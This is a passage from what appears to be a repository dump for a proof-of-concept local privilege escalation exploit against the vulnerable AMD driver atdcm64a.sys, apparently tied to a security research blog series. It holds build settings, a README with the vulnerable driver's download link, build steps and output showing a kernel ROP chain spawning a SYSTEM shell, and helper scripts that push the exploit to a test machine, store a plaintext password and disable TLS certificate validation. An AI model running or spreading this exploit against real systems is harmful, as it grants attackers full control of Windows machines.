    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;WIN32_LEAN_AND_MEAN;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
    <PostBuildEvent>
      <Command>copy $(OutDir)\$(ProjectName).exe x:\temp\.</Command>
    </PostBuildEvent>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="DrvExpTemplate.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`DrvExpTemplate.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="File di origine">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="File di intestazione">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="File di risorse">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="DrvExpTemplate.cpp">
      <Filter>File di origine</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`README.md`:

```md
# ATDCM64a.sys LPE POC

Exploit for atdcm64a.sys vulnerable driver. The vulnerable driver can be downloaded from this [link](https://drivers.amd.com/drivers/beta/win10-64bit-radeon-software-adrenalin-edition-18.12.1.1-dec5.exe).
If not possible follow this procedure:
1. Navigate to this [link](https://www.amd.com/en/support/downloads/previous-drivers.html/graphics/radeon-600-500-400/radeon-rx-500-series/radeon-rx-580.html)
2. Expand the “Windows 10 – 64-bit Edition” tab
3. Download the package Adrenalin Edition 18.12.1.1 Optional (Release date: 2018-12-05)
   
All info are in the blog series [here](https://security.humanativaspa.it/tag/atdcm64a/).

## Compile

Compile with Visual Studio using `Release` `x64`. Exploit will be located at `.\x64\Release\DrvExpTemplate.exe`. Ignore error of type `Exit from command copy <path> x:\temp\`. This command was executed in order to deploy automatically the compiled exploit on the target machine, therefore you can ignore the error. 

## Run

```
PS > whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
PS C:\Users\IEUser\Desktop> .\DrvExpTemplate.exe
[+] Opened handle to device: 0x00000000000000D0
[+] User buffer allocated: 0x0000025BEC060000
[*] sent IOCTL_READMSR
[+] readMSR success.
[+] IA32_LSTAR = 0xFFFFF800264F61C0
[+] g_ntbase = 0xFFFFF80025A00000
[+] object = 0x0000001AFEFF0000
[+] second object = 0x0000001AFEFFFFD0
[+] ptr = 0x0000001AFF000000
[+] object2 = 0x0000025BEC080000
[+] driverObject = 0x0000025BEC090000
[+] ptr->AttachedDevice = 0x0000025BEC080030
[*] fake_stack = 0x00000000FEFF0000
[+] VirtualLock returned successfully
[*] ropStack = 0x00000000FF000000
[*] sc = 0x00001A1A1A003500
[*] pml4shellcode_index 0x0000000000000034
[+] User buffer allocated: 0x0000025BEC070000
[*] sent IOCTL_ARBITRARYCALLDRIVER
[+] arbitraryCallDriver returned successfully.
[*] spawning system shell...
Microsoft Windows [Version 10.0.22631.2861]
(c) Microsoft Corporation. All rights reserved.

>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeCreateTokenPrivilege                    Create a token object                                              Enabled
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Enabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeAuditPrivilege                          Generate security audits                                           Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeTrustedCredManAccessPrivilege           Access Credential Manager as a trusted caller                      Enabled
SeRelabelPrivilege                        Modify an object label                                             Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled

>
```
## References

* https://ommadawn46.medium.com/windows-kernel-exploitation-hevd-on-windows-10-22h2-b407c6f5b8f7

```

`deploy.ps1`:

```ps1

if ( (Get-PSDrive | ? { $_.Name -eq "X" }) -eq $null) {
	net use x: \\windows11\c$ pass /user:IEUser
}

cp x64\Release\DrvExpTemplate.exe x:\temp\



```

`disable_ssl.ps1`:

```ps1
if (-not("dummy" -as [type])) {
    add-type -TypeDefinition @"
using System;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

public static class Dummy {
    public static bool ReturnTrue(object sender,
        X509Certificate certificate,
        X509Chain chain,
        SslPolicyErrors sslPolicyErrors) { return true; }

    public static RemoteCertificateValidationCallback GetDelegate() {
        return new RemoteCertificateValidationCallback(Dummy.ReturnTrue);
    }
}
"@
}

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = [dummy]::GetDelegate()
```

`env.bat`:

```bat
@echo off

echo Setting persistent environment variables...
setx SCP_OVERRIDE 0
setx SCP_REMOTE_IP 192.168.157.133
setx SCP_REMOTE_USER user
setx SCP_REMOTE_PATH /mnt/c/Users/IEUser/Desktop
setx SCP_PRE_DELETE ""

REM Second set lets us call from build.bat if user forgot to reboot
set SCP_OVERRIDE=0
set SCP_REMOTE_IP=192.168.157.133
set SCP_REMOTE_USER=user
set SCP_REMOTE_PATH=/mnt/c/Users/IEUser/Desktop
set SCP_PRE_DELETE=""

echo Done. Now please reboot your machine so the environment variables are taken into account.

```

`pass.txt`:

```txt
pass

```

`scp.bat`:

```bat
@echo off
REM Assumes the following:
REM - current path is PWD (e.g. when running it from Visual Studio Build Events)
REM - PuTTY (which contains Windows scp) is installed
REM - a PuTTY profile session is saved as the ip "x.x.x.x", so pscp (which is 
REM   called by scp.bat) will attempt to use the saved session, and thus 
REM   key, by default.
REM   In order to have pscp.exe use a key by default associated with the host, 
REM   you need to generate a private key *.ppk (using puttygen) and then associated
REM   the key with a "Saved Session" with the IP address as the name "x.x.x.x". You specify it
REM   under Connection->SSH->Auth and just point it at the *.ppk file you generated. 
REM   As long as the session is saved as the ip "x.x.x.x", then pscp (which is 
REM   called by scp.bat) will attempt to use the saved session, and thus 
REM   key, by default.
REM - (optional) You can use Pageant to avoid having to input your SSH key password every time
REM - env.bat was executed in order to define the following environment variables: SCP_OVERRIDE,
REM   SCP_REMOTE_IP, SCP_REMOTE_USER, SCP_REMOTE_PATH, SCP_PRE_DELETE

IF %SCP_OVERRIDE%==1 (
    goto BuildEventOK
)

IF "%SCP_REMOTE_PATH%"=="" (
    echo You didn't specify SCP_REMOTE_PATH, so defaulting to '.'
    set SCP_REMOTE_PATH="."
)

IF "%SCP_REMOTE_IP%"=="" (
    echo You need to define SCP_REMOTE_IP, please execute env.bat
    goto BuildEventFailed
)
IF "%SCP_REMOTE_USER%"=="" (
    echo You need to define SCP_REMOTE_USER, please execute env.bat
    goto BuildEventFailed
)

echo [scp] Copying all files to the remote host: %SCP_REMOTE_IP% with user: %SCP_REMOTE_USER%

IF "%1"=="" (
    echo Usage: scp.bat ^<files^>
    echo    ^<files^> comma separated list of files to copy over ssh
    goto BuildEventFailed
)
set files=%1%

for %%I in (%files%) do (
    if not exist %%I (
        REM echo %%I does not exist, should not happen if not a pdb
        REM goto next
        echo %%I does not exist
        goto BuildEventFailed
    )
    echo [scp] Copying %%I

    IF NOT "%SCP_PRE_DELETE%"=="" (
        REM When I scp to the Windows 10 WSL openssh server I can't overwrite the 
        REM destination path even though my user has permissions. I can however
        REM delete. So this is my hacky way of doing it. %%~nxI gives us just the 
        REM filename without paths
        echo Running pre-delete hack
        echo rm %SCP_REMOTE_PATH%/%%~nxI > putty_cmd.txt
        "C:\Program Files\PuTTy\putty.exe" -ssh -load %SCP_REMOTE_IP% -m putty_cmd.txt
        del putty_cmd.txt
    )

    "C:\Program Files\PuTTY\pscp.exe" -l %SCP_REMOTE_USER% %%I %SCP_REMOTE_IP%:%SCP_REMOTE_PATH%

    if errorlevel 1 goto BuildEventFailed
    :next
    echo ""
)

REM http://geekswithblogs.net/dchestnutt/archive/2006/05/30/80113.aspx
REM unless the final step exits with an error code
goto BuildEventOK

:BuildEventFailed
echo [scp] FAILED
exit /B 1 

:BuildEventOK
echo [scp] COMPLETED OK

```